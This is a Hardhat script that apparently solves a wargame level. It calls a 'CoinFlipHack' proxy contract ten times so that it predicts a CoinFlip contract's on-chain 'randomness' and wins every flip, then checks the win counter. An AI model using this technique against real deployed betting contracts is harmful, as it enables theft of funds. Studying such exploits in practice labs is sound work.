import { ethers } from "hardhat";

async function main(){
    // player address
    let player = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";
    // coinflip smart contract_a address
    let address_a = "0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9";
    // proxy coinflip smart contract to replicate the "randomness"
    let address_b = "0xDc64a140Aa3E981100a9becA4E685f962f0cF6C9";

    let signer = await ethers.getSigner(player);

    // see corresponding smart contract proxy for more details
    let contract_b = await ethers.getContractAt("CoinFlipHack", address_b , signer);
    for(let i = 0 ; i < 10 ; i++){
        await contract_b.hack();
    };

    let contract_a = await ethers.getContractAt("CoinFlip", address_a, signer);

    // check that we indeed win everytime
    let wins = await contract_a.consecutiveWins();
    console.log(wins);

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
